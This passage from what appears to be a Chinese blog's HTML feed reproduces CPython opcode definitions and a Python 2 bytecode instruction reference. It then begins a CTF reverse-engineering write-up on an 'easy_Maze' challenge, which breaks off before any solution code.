JUMP_IF_NOT_EXC_MATCH   121</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SETUP_FINALLY           122</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_FAST               124</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_FAST              125</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_FAST             126</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RAISE_VARARGS           130</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CALL_FUNCTION           131</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAKE_FUNCTION           132</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_SLICE             133</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_CLOSURE            135</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_DEREF              136</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STORE_DEREF             137</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELETE_DEREF            138</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CALL_FUNCTION_KW        141</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CALL_FUNCTION_EX        142</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SETUP_WITH              143</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXTENDED_ARG            144</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_APPEND             145</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SET_ADD                 146</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAP_ADD                 147</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_CLASSDEREF         148</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SETUP_ASYNC_WITH        154</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FORMAT_VALUE            155</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_CONST_KEY_MAP     156</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUILD_STRING            157</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_METHOD             160</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CALL_METHOD             161</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_EXTEND             162</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SET_UPDATE              163</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DICT_MERGE              164</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DICT_UPDATE             165</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/* EXCEPT_HANDLER is a special, implicit block type which is created when</span></span><br><span class="line"><span class="hljs-comment">   entering an except handler. It is not an opcode but we define it here</span></span><br><span class="line"><span class="hljs-comment">   as we want it to be available to both frameobject.c and ceval.c, while</span></span><br><span class="line"><span class="hljs-comment">   remaining private.*/</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXCEPT_HANDLER 257</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* !Py_OPCODE_H */</span></span></span><br></pre></td></tr></tbody></table></figure><p>对应指令的含义如下：</p><h4 id="Bytecode-Instructions"><a href="#Bytecode-Instructions" class="headerlink" title="Bytecode Instructions"></a>Bytecode Instructions</h4><p>The Python compiler currently generates the following bytecode instructions.</p><ul><li><p><code>STOP_CODE</code>()</p><p>Indicates end-of-code to the compiler, not used by the interpreter.</p></li><li><p><code>NOP</code>()</p><p>Do nothing code. Used as a placeholder by the bytecode optimizer.</p></li><li><p><code>POP_TOP</code>()</p><p>Removes the top-of-stack (TOS) item.</p></li><li><p><code>ROT_TWO</code>()</p><p>Swaps the two top-most stack items.</p></li><li><p><code>ROT_THREE</code>()</p><p>Lifts second and third stack item one position up, moves top down to position three.</p></li><li><p><code>ROT_FOUR</code>()</p><p>Lifts second, third and forth stack item one position up, moves top down to position four.</p></li><li><p><code>DUP_TOP</code>()</p><p>Duplicates the reference on top of the stack.</p></li></ul><p>Unary Operations take the top of the stack, apply the operation, and push the result back on the stack.</p><ul><li><p><code>UNARY_POSITIVE</code>()</p><p>Implements <code>TOS = +TOS</code>.</p></li><li><p><code>UNARY_NEGATIVE</code>()</p><p>Implements <code>TOS = -TOS</code>.</p></li><li><p><code>UNARY_NOT</code>()</p><p>Implements <code>TOS = not TOS</code>.</p></li><li><p><code>UNARY_CONVERT</code>()</p><p>Implements <code>TOS = </code>TOS``.</p></li><li><p><code>UNARY_INVERT</code>()</p><p>Implements <code>TOS = ~TOS</code>.</p></li><li><p><code>GET_ITER</code>()</p><p>Implements <code>TOS = iter(TOS)</code>.</p></li></ul><p>Binary operations remove the top of the stack (TOS) and the second top-most stack item (TOS1) from the stack. They perform the operation, and put the result back on the stack.</p><ul><li><p><code>BINARY_POWER</code>()</p><p>Implements <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>BINARY_MULTIPLY</code>()</p><p>Implements <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>BINARY_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>BINARY_FLOOR_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>BINARY_TRUE_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>BINARY_MODULO</code>()</p><p>Implements <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>BINARY_ADD</code>()</p><p>Implements <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>BINARY_SUBTRACT</code>()</p><p>Implements <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>BINARY_SUBSCR</code>()</p><p>Implements <code>TOS = TOS1[TOS]</code>.</p></li><li><p><code>BINARY_LSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>BINARY_RSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>BINARY_AND</code>()</p><p>Implements <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>BINARY_XOR</code>()</p><p>Implements <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>BINARY_OR</code>()</p><p>Implements <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>In-place operations are like binary operations, in that they remove TOS and TOS1, and push the result back on the stack, but the operation is done in-place when TOS1 supports it, and the resulting TOS may be (but does not have to be) the original TOS1.</p><ul><li><p><code>INPLACE_POWER</code>()</p><p>Implements in-place <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>INPLACE_MULTIPLY</code>()</p><p>Implements in-place <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>INPLACE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>INPLACE_FLOOR_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>INPLACE_TRUE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>INPLACE_MODULO</code>()</p><p>Implements in-place <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>INPLACE_ADD</code>()</p><p>Implements in-place <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>INPLACE_SUBTRACT</code>()</p><p>Implements in-place <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>INPLACE_LSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>INPLACE_RSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>INPLACE_AND</code>()</p><p>Implements in-place <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>INPLACE_XOR</code>()</p><p>Implements in-place <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>INPLACE_OR</code>()</p><p>Implements in-place <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>The slice opcodes take up to three parameters.</p><ul><li><p><code>SLICE+0</code>()</p><p>Implements <code>TOS = TOS[:]</code>.</p></li><li><p><code>SLICE+1</code>()</p><p>Implements <code>TOS = TOS1[TOS:]</code>.</p></li><li><p><code>SLICE+2</code>()</p><p>Implements <code>TOS = TOS1[:TOS]</code>.</p></li><li><p><code>SLICE+3</code>()</p><p>Implements <code>TOS = TOS2[TOS1:TOS]</code>.</p></li></ul><p>Slice assignment needs even an additional parameter. As any statement, they put nothing on the stack.</p><ul><li><p><code>STORE_SLICE+0</code>()</p><p>Implements <code>TOS[:] = TOS1</code>.</p></li><li><p><code>STORE_SLICE+1</code>()</p><p>Implements <code>TOS1[TOS:] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+2</code>()</p><p>Implements <code>TOS1[:TOS] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+3</code>()</p><p>Implements <code>TOS2[TOS1:TOS] = TOS3</code>.</p></li><li><p><code>DELETE_SLICE+0</code>()</p><p>Implements <code>del TOS[:]</code>.</p></li><li><p><code>DELETE_SLICE+1</code>()</p><p>Implements <code>del TOS1[TOS:]</code>.</p></li><li><p><code>DELETE_SLICE+2</code>()</p><p>Implements <code>del TOS1[:TOS]</code>.</p></li><li><p><code>DELETE_SLICE+3</code>()</p><p>Implements <code>del TOS2[TOS1:TOS]</code>.</p></li><li><p><code>STORE_SUBSCR</code>()</p><p>Implements <code>TOS1[TOS] = TOS2</code>.</p></li><li><p><code>DELETE_SUBSCR</code>()</p><p>Implements <code>del TOS1[TOS]</code>.</p></li></ul><p>Miscellaneous opcodes.</p><ul><li><p><code>PRINT_EXPR</code>()</p><p>Implements the expression statement for the interactive mode. TOS is removed from the stack and printed. In non-interactive mode, an expression statement is terminated with <a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a>.</p></li><li><p><code>PRINT_ITEM</code>()</p><p>Prints TOS to the file-like object bound to <code>sys.stdout</code>. There is one such instruction for each item in the <a href="https://docs.python.org/2/reference/simple_stmts.html#print"><code>print</code></a> statement.</p></li><li><p><code>PRINT_ITEM_TO</code>()</p><p>Like <code>PRINT_ITEM</code>, but prints the item second from TOS to the file-like object at TOS. This is used by the extended print statement.</p></li><li><p><code>PRINT_NEWLINE</code>()</p><p>Prints a new line on <code>sys.stdout</code>. This is generated as the last operation of a <a href="https://docs.python.org/2/reference/simple_stmts.html#print"><code>print</code></a> statement, unless the statement ends with a comma.</p></li><li><p><code>PRINT_NEWLINE_TO</code>()</p><p>Like <code>PRINT_NEWLINE</code>, but prints the new line on the file-like object on the TOS. This is used by the extended print statement.</p></li><li><p><code>BREAK_LOOP</code>()</p><p>Terminates a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#break"><code>break</code></a> statement.</p></li><li><p><code>CONTINUE_LOOP</code>(<em>target</em>)</p><p>Continues a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#continue"><code>continue</code></a> statement. <em>target</em> is the address to jump to (which should be a <a href="https://docs.python.org/2/library/dis.html#opcode-FOR_ITER"><code>FOR_ITER</code></a> instruction).</p></li><li><p><code>LIST_APPEND</code>(<em>i</em>)</p><p>Calls <code>list.append(TOS[-i], TOS)</code>. Used to implement list comprehensions. While the appended value is popped off, the list object remains on the stack so that it is available for further iterations of the loop.</p></li><li><p><code>LOAD_LOCALS</code>()</p><p>Pushes a reference to the locals of the current scope on the stack. This is used in the code for a class definition: After the class body is evaluated, the locals are passed to the class definition.</p></li><li><p><code>RETURN_VALUE</code>()</p><p>Returns with TOS to the caller of the function.</p></li><li><p><code>YIELD_VALUE</code>()</p><p>Pops <code>TOS</code> and yields it from a <a href="https://docs.python.org/2/glossary.html#term-generator">generator</a>.</p></li><li><p><code>IMPORT_STAR</code>()</p><p>Loads all symbols not starting with <code>'_'</code> directly from the module TOS to the local namespace. The module is popped after loading all names. This opcode implements <code>from module import *</code>.</p></li><li><p><code>EXEC_STMT</code>()</p><p>Implements <code>exec TOS2,TOS1,TOS</code>. The compiler fills missing optional parameters with <code>None</code>.</p></li><li><p><code>POP_BLOCK</code>()</p><p>Removes one block from the block stack. Per frame, there is a stack of blocks, denoting nested loops, try statements, and such.</p></li><li><p><code>END_FINALLY</code>()</p><p>Terminates a <a href="https://docs.python.org/2/reference/compound_stmts.html#finally"><code>finally</code></a> clause. The interpreter recalls whether the exception has to be re-raised, or whether the function returns, and continues with the outer-next block.</p></li><li><p><code>BUILD_CLASS</code>()</p><p>Creates a new class object. TOS is the methods dictionary, TOS1 the tuple of the names of the base classes, and TOS2 the class name.</p></li><li><p><code>SETUP_WITH</code>(<em>delta</em>)</p><p>This opcode performs several operations before a with block starts. First, it loads <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a> from the context manager and pushes it onto the stack for later use by <a href="https://docs.python.org/2/library/dis.html#opcode-WITH_CLEANUP"><code>WITH_CLEANUP</code></a>. Then, <a href="https://docs.python.org/2/reference/datamodel.html#object.__enter__"><code>__enter__()</code></a> is called, and a finally block pointing to <em>delta</em> is pushed. Finally, the result of calling the enter method is pushed onto the stack. The next opcode will either ignore it (<a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a>), or store it in (a) variable(s) (<a href="https://docs.python.org/2/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a>, <a href="https://docs.python.org/2/library/dis.html#opcode-STORE_NAME"><code>STORE_NAME</code></a>, or <a href="https://docs.python.org/2/library/dis.html#opcode-UNPACK_SEQUENCE"><code>UNPACK_SEQUENCE</code></a>).</p></li><li><p><code>WITH_CLEANUP</code>()</p><p>Cleans up the stack when a <a href="https://docs.python.org/2/reference/compound_stmts.html#with"><code>with</code></a> statement block exits. On top of the stack are 1–3 values indicating how/why the finally clause was entered:TOP = <code>None</code>(TOP, SECOND) = (<code>WHY_{RETURN,CONTINUE}</code>), retvalTOP = <code>WHY_*</code>; no retval below it(TOP, SECOND, THIRD) = exc_info()Under them is EXIT, the context manager’s <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a> bound method.In the last case, <code>EXIT(TOP, SECOND, THIRD)</code> is called, otherwise <code>EXIT(None, None, None)</code>.EXIT is removed from the stack, leaving the values above it in the same order. In addition, if the stack represents an exception, <em>and</em> the function call returns a ‘true’ value, this information is “zapped”, to prevent <code>END_FINALLY</code> from re-raising the exception. (But non-local gotos should still be resumed.)</p></li></ul><p>All of the following opcodes expect arguments. An argument is two bytes, with the more significant byte last.</p><ul><li><p><code>STORE_NAME</code>(<em>namei</em>)</p><p>Implements <code>name = TOS</code>. <em>namei</em> is the index of <em>name</em> in the attribute <code>co_names</code> of the code object. The compiler tries to use <code>STORE_FAST</code> or <code>STORE_GLOBAL</code> if possible.</p></li><li><p><code>DELETE_NAME</code>(<em>namei</em>)</p><p>Implements <code>del name</code>, where <em>namei</em> is the index into <code>co_names</code> attribute of the code object.</p></li><li><p><code>UNPACK_SEQUENCE</code>(<em>count</em>)</p><p>Unpacks TOS into <em>count</em> individual values, which are put onto the stack right-to-left.</p></li><li><p><code>DUP_TOPX</code>(<em>count</em>)</p><p>Duplicate <em>count</em> items, keeping them in the same order. Due to implementation limits, <em>count</em> should be between 1 and 5 inclusive.</p></li><li><p><code>STORE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>TOS.name = TOS1</code>, where <em>namei</em> is the index of name in <code>co_names</code>.</p></li><li><p><code>DELETE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>del TOS.name</code>, using <em>namei</em> as index into <code>co_names</code>.</p></li><li><p><code>STORE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>STORE_NAME</code>, but stores the name as a global.</p></li><li><p><code>DELETE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>DELETE_NAME</code>, but deletes a global name.</p></li><li><p><code>LOAD_CONST</code>(<em>consti</em>)</p><p>Pushes <code>co_consts[consti]</code> onto the stack.</p></li><li><p><code>LOAD_NAME</code>(<em>namei</em>)</p><p>Pushes the value associated with <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>BUILD_TUPLE</code>(<em>count</em>)</p><p>Creates a tuple consuming <em>count</em> items from the stack, and pushes the resulting tuple onto the stack.</p></li><li><p><code>BUILD_LIST</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a list.</p></li><li><p><code>BUILD_SET</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a set.<em>New in version 2.7.</em></p></li><li><p><code>BUILD_MAP</code>(<em>count</em>)</p><p>Pushes a new dictionary object onto the stack. The dictionary is pre-sized to hold <em>count</em> entries.</p></li><li><p><code>LOAD_ATTR</code>(<em>namei</em>)</p><p>Replaces TOS with <code>getattr(TOS, co_names[namei])</code>.</p></li><li><p><code>COMPARE_OP</code>(<em>opname</em>)</p><p>Performs a Boolean operation. The operation name can be found in <code>cmp_op[opname]</code>.</p></li><li><p><code>IMPORT_NAME</code>(<em>namei</em>)</p><p>Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of <a href="https://docs.python.org/2/library/functions.html#__import__"><code>__import__()</code></a>. The module object is pushed onto the stack. The current namespace is not affected: for a proper import statement, a subsequent <code>STORE_FAST</code> instruction modifies the namespace.</p></li><li><p><code>IMPORT_FROM</code>(<em>namei</em>)</p><p>Loads the attribute <code>co_names[namei]</code> from the module found in TOS. The resulting object is pushed onto the stack, to be subsequently stored by a <code>STORE_FAST</code> instruction.</p></li><li><p><code>JUMP_FORWARD</code>(<em>delta</em>)</p><p>Increments bytecode counter by <em>delta</em>.</p></li><li><p><code>POP_JUMP_IF_TRUE</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>POP_JUMP_IF_FALSE</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>JUMP_IF_TRUE_OR_POP</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is false), TOS is popped.</p></li><li><p><code>JUMP_IF_FALSE_OR_POP</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is true), TOS is popped.</p></li><li><p><code>JUMP_ABSOLUTE</code>(<em>target</em>)</p><p>Set bytecode counter to <em>target</em>.</p></li><li><p><code>FOR_ITER</code>(<em>delta</em>)</p><p><code>TOS</code> is an <a href="https://docs.python.org/2/glossary.html#term-iterator">iterator</a>. Call its <code>next()</code> method. If this yields a new value, push it on the stack (leaving the iterator below it). If the iterator indicates it is exhausted <code>TOS</code> is popped, and the bytecode counter is incremented by <em>delta</em>.</p></li><li><p><code>LOAD_GLOBAL</code>(<em>namei</em>)</p><p>Loads the global named <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>SETUP_LOOP</code>(<em>delta</em>)</p><p>Pushes a block for a loop onto the block stack. The block spans from the current instruction with a size of <em>delta</em> bytes.</p></li><li><p><code>SETUP_EXCEPT</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the first except block.</p></li><li><p><code>SETUP_FINALLY</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the finally block.</p></li><li><p><code>STORE_MAP</code>()</p><p>Store a key and value pair in a dictionary. Pops the key and value while leaving the dictionary on the stack.</p></li><li><p><code>LOAD_FAST</code>(<em>var_num</em>)</p><p>Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack.</p></li><li><p><code>STORE_FAST</code>(<em>var_num</em>)</p><p>Stores TOS into the local <code>co_varnames[var_num]</code>.</p></li><li><p><code>DELETE_FAST</code>(<em>var_num</em>)</p><p>Deletes local <code>co_varnames[var_num]</code>.</p></li><li><p><code>LOAD_CLOSURE</code>(<em>i</em>)</p><p>Pushes a reference to the cell contained in slot <em>i</em> of the cell and free variable storage. The name of the variable is <code>co_cellvars[i]</code> if <em>i</em> is less than the length of <em>co_cellvars</em>. Otherwise it is <code>co_freevars[i - len(co_cellvars)]</code>.</p></li><li><p><code>LOAD_DEREF</code>(<em>i</em>)</p><p>Loads the cell contained in slot <em>i</em> of the cell and free variable storage. Pushes a reference to the object the cell contains on the stack.</p></li><li><p><code>STORE_DEREF</code>(<em>i</em>)</p><p>Stores TOS into the cell contained in slot <em>i</em> of the cell and free variable storage.</p></li><li><p><code>SET_LINENO</code>(<em>lineno</em>)</p><p>This opcode is obsolete.</p></li><li><p><code>RAISE_VARARGS</code>(<em>argc</em>)</p><p>Raises an exception. <em>argc</em> indicates the number of arguments to the raise statement, ranging from 0 to 3. The handler will find the traceback as TOS2, the parameter as TOS1, and the exception as TOS.</p></li><li><p><code>CALL_FUNCTION</code>(<em>argc</em>)</p><p>Calls a callable object. The low byte of <em>argc</em> indicates the number of positional arguments, the high byte the number of keyword arguments. The stack contains keyword arguments on top (if any), then the positional arguments below that (if any), then the callable object to call below that. Each keyword argument is represented with two values on the stack: the argument’s name, and its value, with the argument’s value above the name on the stack. The positional arguments are pushed in the order that they are passed in to the callable object, with the right-most positional argument on top. <code>CALL_FUNCTION</code> pops all arguments and the callable object off the stack, calls the callable object with those arguments, and pushes the return value returned by the callable object.</p></li><li><p><code>MAKE_FUNCTION</code>(<em>argc</em>)</p><p>Pushes a new function object on the stack. TOS is the code associated with the function. The function object is defined to have <em>argc</em> default parameters, which are found below TOS.</p></li><li><p><code>MAKE_CLOSURE</code>(<em>argc</em>)</p><p>Creates a new function object, sets its <em>func_closure</em> slot, and pushes it on the stack. TOS is the code associated with the function, TOS1 the tuple containing cells for the closure’s free variables. The function also has <em>argc</em> default parameters, which are found below the cells.</p></li><li><p><code>BUILD_SLICE</code>(<em>argc</em>)</p><p>Pushes a slice object on the stack. <em>argc</em> must be 2 or 3. If it is 2, <code>slice(TOS1, TOS)</code> is pushed; if it is 3, <code>slice(TOS2, TOS1, TOS)</code> is pushed. See the <a href="https://docs.python.org/2/library/functions.html#slice"><code>slice()</code></a> built-in function for more information.</p></li><li><p><code>EXTENDED_ARG</code>(<em>ext</em>)</p><p>Prefixes any opcode which has an argument too big to fit into the default two bytes. <em>ext</em> holds two additional bytes which, taken together with the subsequent opcode’s argument, comprise a four-byte argument, <em>ext</em> being the two most-significant bytes.</p></li><li><p><code>CALL_FUNCTION_VAR</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains an iterable object containing additional positional arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable object is called, the iterable object is “unpacked” and its contents are appended to the positional arguments passed in. The iterable object is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object containing additional keyword arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object at the top of the stack is “unpacked” and its contents are appended to the keyword arguments passed in. The mapping object at the top of the stack is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_VAR_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. Below that is an iterable object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a>. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object and iterable object are each “unpacked” and their contents passed in as keyword and positional arguments respectively, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. The mapping object and iterable object are both ignored when computing the value of <code>argc</code>.</p></li><li><p><code>HAVE_ARGUMENT</code>()</p><p>This is not really an opcode. It identifies the dividing line between opcodes which don’t take arguments <code>&lt; HAVE_ARGUMENT</code> and those which do <code>&gt;= HAVE_ARGUMENT</code>.</p></li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 查表 </tag>
            
            <tag> python </tag>
            
            <tag> opcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（五）</title>
      <link href="/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>后面的题目也越来越难了，比较难比较复杂的题目会单拉出来写，这里就记录一些比较简单的题目。</p><span id="more"></span><h4 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h4><p>看名字就知道是个迷宫题，IDA打开看看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 